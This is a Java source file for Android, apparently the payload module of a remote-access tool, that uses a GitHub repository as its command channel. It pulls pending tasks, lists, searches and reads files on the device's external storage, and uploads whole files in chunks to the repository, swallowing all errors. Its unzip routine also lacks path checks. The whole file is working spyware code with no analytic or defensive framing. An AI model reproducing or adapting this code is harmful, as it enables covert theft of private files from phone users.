import com.yb.fa.GitHub;
import org.json.*;
import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.*;
import java.util.*;
import java.util.zip.*;

public class Payload {

    public void run(GitHub gh, Context ctx) {
        JSONObject cmd = null;
        try { cmd = gh.getJson("tasks/pending.json"); } catch (Throwable e) { return; }
        if (cmd == null) return;
        String id = cmd.optString("id", "x");
        String op = cmd.optString("op", "");
        JSONObject res = new JSONObject();
        try {
            res.put("id", id); res.put("op", op); res.put("ts", System.currentTimeMillis()); res.put("ok", false);
            if (op.equals("list")) list(gh, cmd, res);
            else if (op.equals("tree")) tree(gh, cmd, res);
            else if (op.equals("search")) search(gh, cmd, res);
            else if (op.equals("stat")) stat(gh, cmd, res);
            else if (op.equals("read")) read(gh, cmd, res);
            else if (op.equals("upload")) upload(gh, cmd, res);
            else if (op.equals("unzip")) unzip(gh, cmd, res);
            else res.put("err", "unknown op " + op);
        } catch (Throwable e) {
            try { res.put("err", String.valueOf(e)); } catch (Exception e2) {}
        }
        try { gh.putFile("results/" + id + ".json", res.toString()); } catch (Throwable e) {}
        try { gh.delete("tasks/pending.json"); } catch (Throwable e) {}
    }

    static String P(JSONObject c) {
        String p = c.optString("path", "");
        if (p.length() == 0) p = Environment.getExternalStorageDirectory().getAbsolutePath();
        return p;
    }

    static void list(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File d = new File(P(c));
        if (!d.exists()) { r.put("err", "not exists: " + d.getAbsolutePath()); return; }
        JSONArray a = new JSONArray();
        File[] fs = d.listFiles();
        if (fs != null) {
            Arrays.sort(fs, new Comparator<File>() {
                public int compare(File x, File y) {
                    if (x.isDirectory() != y.isDirectory()) return x.isDirectory() ? -1 : 1;
                    return x.getName().compareToIgnoreCase(y.getName());
                }
            });
            for (File f : fs) {
                JSONObject o = new JSONObject();
                o.put("n", f.getName()); o.put("d", f.isDirectory()); o.put("s", f.length());
                a.put(o);
            }
        }
        r.put("path", d.getAbsolutePath()); r.put("items", a); r.put("ok", true);
    }

    static int[] cnt = new int[1];
    static void walk(File d, JSONArray a, int dep, int max, int lim) {
        if (dep > max || cnt[0] >= lim) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (cnt[0] >= lim) return;
            JSONObject o = new JSONObject();
            try { o.put("p", f.getAbsolutePath()); o.put("d", f.isDirectory()); o.put("s", f.length()); }
            catch (Exception e) { continue; }
            a.put(o); cnt[0]++;
            if (f.isDirectory()) walk(f, a, dep + 1, max, lim);
        }
    }

    static void tree(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File root = new File(P(c));
        JSONArray a = new JSONArray();
        cnt[0] = 0;
        walk(root, a, 0, c.optInt("depth", 2), c.optInt("limit", 3000));
        r.put("path", root.getAbsolutePath()); r.put("items", a); r.put("ok", true);
    }

    static void search(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        String kw = c.optString("kw", "").toLowerCase();
        File root = new File(P(c));
        int lim = c.optInt("limit", 500);
        long dl = System.currentTimeMillis() + c.optInt("timeoutSec", 120) * 1000L;
        JSONArray a = new JSONArray();
        int[] n = new int[1];
        ArrayDeque<File> st = new ArrayDeque<File>();
        st.push(root);
        while (!st.isEmpty() && n[0] < lim && System.currentTimeMillis() < dl) {
            File d = st.pop();
            File[] fs = d.listFiles();
            if (fs == null) continue;
            for (File f : fs) {
                if (n[0] >= lim || System.currentTimeMillis() > dl) break;
                if (f.isDirectory()) { st.push(f); continue; }
                if (f.getName().toLowerCase().contains(kw)) {
                    JSONObject o = new JSONObject();
                    o.put("p", f.getAbsolutePath()); o.put("s", f.length());
                    a.put(o); n[0]++;
                }
            }
        }
        r.put("kw", kw); r.put("count", n[0]); r.put("items", a); r.put("ok", true);
    }

    static void stat(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        r.put("path", f.getAbsolutePath());
        r.put("exists", f.exists());
        if (f.exists()) {
            r.put("size", f.length()); r.put("isDir", f.isDirectory()); r.put("mtime", f.lastModified());
        }
        r.put("ok", true);
    }

    static void read(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        if (!f.exists()) { r.put("err", "not exists"); return; }
        long off = c.optLong("offset", 0);
        int len = (int) Math.min(c.optInt("len", 65536), f.length() - off);
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        raf.seek(off);
        byte[] b = new byte[len];
        raf.readFully(b);
        raf.close();
        r.put("size", f.length()); r.put("offset", off); r.put("len", len);
        r.put("b64", Base64.encodeToString(b, Base64.NO_WRAP));
        r.put("ok", true);
    }

    static void upload(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File f = new File(P(c));
        if (!f.exists()) { r.put("err", "not exists"); return; }
        int chunk = c.optInt("chunkMB", 16) * 1024 * 1024;
        long size = f.length();
        JSONArray shas = new JSONArray();
        RandomAccessFile raf = new RandomAccessFile(f, "r");
        byte[] buf = new byte[chunk];
        int n, parts = 0;
        while ((n = raf.read(buf)) > 0) {
            byte[] part = (n == chunk) ? buf : Arrays.copyOf(buf, n);
            shas.put(gh.putBlob(part));
            parts++;
        }
        raf.close();
        JSONObject m = new JSONObject();
        m.put("name", f.getName());
        m.put("path", f.getAbsolutePath());
        m.put("size", size);
        m.put("chunk", chunk);
        m.put("parts", parts);
        m.put("shas", shas);
        String mp = "uploads/" + f.getName() + "." + System.currentTimeMillis() + ".manifest.json";
        gh.putFile(mp, m.toString());
        r.put("manifest", mp); r.put("parts", parts); r.put("size", size); r.put("ok", true);
    }

    static void unzip(GitHub gh, JSONObject c, JSONObject r) throws Exception {
        File z = new File(P(c));
        if (!z.exists()) { r.put("err", "not exists"); return; }
        File out = new File(c.optString("out", z.getParent() + "/ybfa_" + z.getName().replaceAll("\\W+", "_")));
        out.mkdirs();
        int n = 0;
        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(z)));
        ZipEntry e;
        byte[] b = new byte[262144];
        while ((e = zis.getNextEntry()) != null) {
            File t = new File(out, e.getName());
            if (e.isDirectory()) { t.mkdirs(); continue; }
            t.getParentFile().mkdirs();
            FileOutputStream fo = new FileOutputStream(t);
            int k;
            while ((k = zis.read(b)) > 0) fo.write(b, 0, k);
            fo.close();
            n++;
        }
        zis.close();
        r.put("out", out.getAbsolutePath()); r.put("files", n); r.put("ok", true);
    }
}
